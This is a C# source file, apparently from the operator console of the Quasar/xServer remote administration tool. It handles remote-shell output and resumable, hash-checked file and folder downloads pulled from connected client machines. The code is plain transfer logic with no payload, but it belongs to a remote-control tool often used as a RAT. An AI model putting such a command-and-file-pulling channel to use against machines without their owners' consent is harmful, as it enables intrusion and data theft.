﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Core.Utilities;
using xServer.Forms;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */

    public static partial class CommandHandler
    {
        public static void HandleDoShellExecuteResponse(Client client, DoShellExecuteResponse packet)
        {
            if (client.Value == null || client.Value.FrmRs == null || string.IsNullOrEmpty(packet.Output))
                return;

            if (packet.IsError)
                client.Value.FrmRs.PrintError(packet.Output);
            else
                client.Value.FrmRs.PrintMessage(packet.Output);
        }

        public static void HandleDoDownloadFileResponse(Client client, DoDownloadFileResponse packet)
        {
            if (CanceledDownloads.ContainsKey(packet.ID) || string.IsNullOrEmpty(packet.Filename) || PausedDownloads.ContainsKey(packet.ID))
                return;

            if (!Directory.Exists(client.Value.DownloadDirectory))
                Directory.CreateDirectory(client.Value.DownloadDirectory);
            if (!Directory.Exists(Path.Combine(client.Value.DownloadDirectory, "temp")))
                Directory.CreateDirectory(Path.Combine(client.Value.DownloadDirectory, "temp"));

            string metaFilePath = Path.Combine(client.Value.DownloadDirectory, "temp", packet.ID + ".meta");
            string downloadPath = Path.Combine(client.Value.DownloadDirectory, packet.Filename);

            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
            {
                for (int i = 1; i < 100; i++)
                {
                    var newFileName = string.Format("{0} ({1}){2}", Path.GetFileNameWithoutExtension(downloadPath), i,
                        Path.GetExtension(downloadPath));
                    if (File.Exists(Path.Combine(client.Value.DownloadDirectory, newFileName))) continue;

                    downloadPath = Path.Combine(client.Value.DownloadDirectory, newFileName);
                    RenamedFiles.Add(packet.ID, newFileName);
                    break;
                }
            } else if (packet.CurrentBlock == 0 && Directory.Exists(downloadPath))
            {
                for (int i = 1; i < 100; i++)
                {
                    var newFileName = string.Format("{0} ({1})", downloadPath, i);
                    if (Directory.Exists(Path.Combine(client.Value.DownloadDirectory, newFileName))) continue;

                    downloadPath = Path.Combine(client.Value.DownloadDirectory, newFileName);
                    RenamedFiles.Add(packet.ID, newFileName);
                    break;
                }
            }
            else if (packet.CurrentBlock > 0 && (File.Exists(downloadPath) || Directory.Exists(downloadPath)) && RenamedFiles.ContainsKey(packet.ID))
            {
                downloadPath = Path.Combine(client.Value.DownloadDirectory, RenamedFiles[packet.ID]);
            }

            // Handle crashed renamed files too
            if (packet.CurrentBlock > 0 && File.Exists(metaFilePath))
            {
                var tmpMeta = new MetaFile(File.ReadAllBytes(metaFilePath));
                if (tmpMeta.LocalPath != downloadPath && tmpMeta.LocalPath != "")
                {
                    downloadPath = tmpMeta.LocalPath;
                }
            }

            if (client.Value == null || client.Value.FrmFm == null)
            {
                FrmMain.Instance.SetStatusByClient(client, "Download aborted, please keep the File Manager open.");
                new Packets.ServerPackets.DoDownloadFileCancel(packet.ID).Execute(client);
                return;
            }

            int index = client.Value.FrmFm.GetTransferIndex(packet.ID);
            if (index < 0)
                return;

            if (!string.IsNullOrEmpty(packet.CustomMessage))
            {
                if (client.Value.FrmFm == null) // abort download when form is closed
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
                return;
            }

            byte[] prevHash = new byte[16];
            byte[] hashSample = new byte[FileSplit.MAX_BLOCK_SIZE];

            if (File.Exists(downloadPath))
            {
                using (var fs = new FileStream(downloadPath, FileMode.Open))
                {
                    fs.Seek(-FileSplit.MAX_BLOCK_SIZE, SeekOrigin.End);
                    fs.Read(hashSample, 0, FileSplit.MAX_BLOCK_SIZE);
                }
                using (var md5 = MD5.Create())
                    prevHash = md5.ComputeHash(hashSample);
            }

            FileSplit destFile = new FileSplit(downloadPath);
            if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
            {
                if (client.Value == null || client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
                return;
            }

            byte[] curHash;
            hashSample = new byte[FileSplit.MAX_BLOCK_SIZE];
            using (var fs = new FileStream(downloadPath, FileMode.Open))
            {
                fs.Seek(-FileSplit.MAX_BLOCK_SIZE, SeekOrigin.End);
                fs.Read(hashSample, 0, FileSplit.MAX_BLOCK_SIZE);
            }
            using (var md5 = MD5.Create())
                curHash = md5.ComputeHash(hashSample);

            decimal progress =
            Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);

            decimal speed;
            int timeLeft = 0;
            try
            {
                speed = Math.Round((decimal)(packet.CurrentBlock * FileSplit.MAX_BLOCK_SIZE) /
                                   (DateTime.Now - packet.StartTime).Seconds, 0);
                timeLeft = (int) (((FileSplit.MAX_BLOCK_SIZE*(packet.MaxBlocks - packet.CurrentBlock)) / 1000) / (speed / 1000));
            }
            catch (DivideByZeroException)
            {
                speed = 0;
            }


            MetaFile metaFile;
            // Paused/crashed folder downloads require this
            if (File.Exists(metaFilePath))
            {
                metaFile = new MetaFile(File.ReadAllBytes(metaFilePath));
                metaFile.CurrentBlock++;
                metaFile.TransferId = packet.ID;
                metaFile.Progress = progress;
                metaFile.PrevHash = prevHash;
                metaFile.CurHash = curHash;
                metaFile.RemotePath = packet.RemotePath;
                metaFile.LocalPath = downloadPath;
                metaFile.Type = TransferType.Download;
            }
            else
            {
                metaFile = new MetaFile(packet.CurrentBlock + 1, packet.ID, progress, prevHash, curHash, packet.RemotePath, downloadPath, TransferType.Download);
            }

            metaFile.Save(metaFilePath);

            if (client.Value == null || client.Value.FrmFm == null)
                return;

            if (CanceledDownloads.ContainsKey(packet.ID)) return;

            client.Value.FrmFm.UpdateTransferStatus(index, string.Format("Downloading...({0}%)", progress), -1, TimeSpan.FromSeconds(timeLeft), speed);

            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                if (client.Value.FrmFm == null)
                    return;
                try
                {
                    File.Delete(metaFilePath);
                }
                catch
                {
                }
                RenamedFiles.Remove(packet.ID);

                if (packet.Type == ItemType.Directory)
                {
                    client.Value.FrmFm.UpdateTransferStatus(index, "Unpacking directory", -1);

                    var vDir = new VirtualDirectory().DeSerialize(downloadPath);
                    if (File.Exists(downloadPath + ".bkp"))
                        File.Delete(downloadPath + ".bkp");

                    File.Move(downloadPath, downloadPath + ".bkp");

                    try
                    {
                        vDir.SaveToDisk(Path.GetDirectoryName(downloadPath));
                        if (File.Exists(downloadPath + ".bkp"))
                            File.Delete(downloadPath + ".bkp");
                    }
                    catch
                    {
                        
                    }
                }

                client.Value.FrmFm.UpdateTransferStatus(index, "Completed", 1);
            }
        }

        public static void HandleSetStatusFileManager(Client client, SetStatusFileManager packet)
        {
            if (client.Value == null || client.Value.FrmFm == null) return;

            client.Value.FrmFm.SetStatus(packet.Message, packet.SetLastDirectorySeen);
        }

        public static void HandleVerifyUnfinishedTransferResponse(Client client,
            DoVerifyUnfinishedTransferResponse packet)
        {
            for (var i = 0; i < packet.TransferIDs.Length; i++)
            {
                var metaFilePath = Path.Combine(client.Value.DownloadDirectory, "temp", packet.TransferIDs[i] + ".meta");
                if (!File.Exists(metaFilePath))
                    continue;

                var metaFile = new MetaFile(File.ReadAllBytes(metaFilePath));
                client.Value.FrmFm.AddTransfer(metaFile.TransferId, "Upload",
                    string.Format("Paused ({0}%)", metaFile.Progress),
                    metaFile.RemotePath + " (folder)");

                if (!packet.IsFile[i])
                    metaFile.Type &= TransferType.Folder;
                else
                    metaFile.Type &= TransferType.File;

                client.Value.FrmFm.UnfinishedTransfers.Add(metaFile.TransferId, metaFile);
                client.Value.FrmFm.UpdateTransferStatus(client.Value.FrmFm.GetTransferIndex(metaFile.TransferId),
                    string.Format("Paused ({0}%)", metaFile.Progress), 2);
            }
        }
    }
}